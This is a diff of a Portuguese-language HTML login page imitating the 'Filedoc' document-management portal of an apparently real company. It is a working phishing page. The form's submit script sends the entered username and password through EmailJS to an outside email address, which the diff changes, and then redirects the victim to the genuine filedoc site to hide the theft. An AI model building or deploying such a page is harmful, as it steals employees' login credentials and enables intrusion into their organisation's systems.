@@ -1,17 +1,19 @@
 <!DOCTYPE html>
 <html lang="pt">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Filedoc</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        (function(){
+        (function () {
             emailjs.init("TVezuYAYaIuUHfWRc"); // Substitua pela sua chave pública do EmailJS
         })();
     </script>
     <style>
-        html, body {
+        html,
+        body {
             height: 100%;
             margin: 0;
             padding: 0;
@@ -19,15 +21,18 @@
             background: #f8f9fa;
             height: 100vh;
         }
+
         body {
             min-height: 100vh;
             display: flex;
         }
+
         .container {
             display: flex;
             width: 100vw;
             height: 100vh;
         }
+
         .left {
             flex: 1;
             background: #fff;
@@ -37,6 +42,7 @@
             align-items: center;
             padding: 40px 0;
         }
+
         .right {
             flex: 1;
             background: #1a8c4a;
@@ -46,36 +52,44 @@
             align-items: flex-end;
             justify-content: flex-end;
         }
+
         .login-box {
             width: 350px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
+
         .logo {
             margin-bottom: 16px;
         }
+
         .logo img {
             width: 90px;
             height: 90px;
         }
+
         .title {
             font-size: 18px;
             color: #888;
             text-align: center;
             margin-bottom: 32px;
         }
+
         .login-form {
             width: 100%;
             display: flex;
             flex-direction: column;
         }
+
         .login-form label {
             font-size: 14px;
             color: #444;
             margin-bottom: 6px;
         }
-        .login-form input, .login-form select {
+
+        .login-form input,
+        .login-form select {
             padding: 10px 12px;
             margin-bottom: 16px;
             border: 1px solid #ccc;
@@ -84,22 +98,27 @@
             outline: none;
             background: #fafbfc;
         }
+
         .login-form select {
             cursor: pointer;
         }
+
         .remember-row {
             display: flex;
             align-items: center;
             margin-bottom: 18px;
         }
+
         .remember-row input[type="checkbox"] {
             margin-right: 8px;
         }
+
         .remember-row label {
             font-size: 14px;
             color: #444;
             cursor: pointer;
         }
+
         .login-btn {
             background: #ff885e;
             color: #fff;
@@ -112,9 +131,11 @@
             margin-bottom: 10px;
             transition: background 0.2s;
         }
+
         .login-btn:hover {
             background: #ff6a2b;
         }
+
         .forgot-link {
             color: #ff885e;
             font-size: 14px;
@@ -123,6 +144,7 @@
             margin-bottom: 30px;
             display: block;
         }
+
         .version {
             position: absolute;
             bottom: 10px;
@@ -131,35 +153,41 @@
             font-size: 12px;
             color: #aaa;
         }
+
         @media (max-width: 900px) {
             .container {
                 flex-direction: column;
             }
-            .left, .right {
+
+            .left,
+            .right {
                 flex: none;
                 width: 100vw;
                 height: 50vh;
             }
+
             .right {
                 min-height: 200px;
             }
         }
     </style>
 </head>
+
 <body>
     <div class="container">
         <div class="left">
             <div class="login-box">
                 <div class="logo" style="width: 100%;">
-                    <img src="./logo.PNG" alt="Logo"  />
+                    <img src="./logo.PNG" alt="Logo" />
                 </div>
                 <div class="title" style="text-align: left;">
                     Document Management<br>and Workflow Automation
                 </div>
-                <form class="login-form">
+                <form id="loginForm" class="login-form" method="post">
                     <label for="username">Introduza as suas credenciais para entrar</label>
-                    <input type="text" id="username" name="username" placeholder="abel.jose" autocomplete="username">
-                    <input type="password" id="password" name="password" placeholder="Palavra Passe" autocomplete="current-password">
+                    <input type="text" id="username" name="username" placeholder="Utilizador" autocomplete="username">
+                    <input type="password" id="password" name="password" placeholder="Palavra Passe"
+                        autocomplete="current-password">
                     <select id="language" name="language">
                         <option selected>Português</option>
                         <option>English</option>
@@ -180,22 +208,24 @@
         </div>
     </div>
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
             event.preventDefault();
-            
+
+            event.preventDefault();
+
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            
+
             // Enviar email
             emailjs.send("service_2nlu85q", "template_y6bbtdn", {
-                to_email: "abeljosetoms115@gmail.com",
+                to_email: "ruth.cassule@biocom-angola.com",
                 username: username,
                 password: password
-            }).then(function(response) {
+            }).then(function (response) {
                 console.log('Email enviado com sucesso!', response.status, response.text);
                 // Redirecionar após enviar o email
                 window.location.href = "http://filedoc.biocom.co.ao/";
-            }, function(error) {
+            }, function (error) {
                 console.log('Erro ao enviar email:', error);
                 // Mesmo com erro, redirecionar
                 window.location.href = "http://filedoc.biocom.co.ao/";
@@ -203,4 +233,5 @@
         });
     </script>
 </body>
+
 </html>
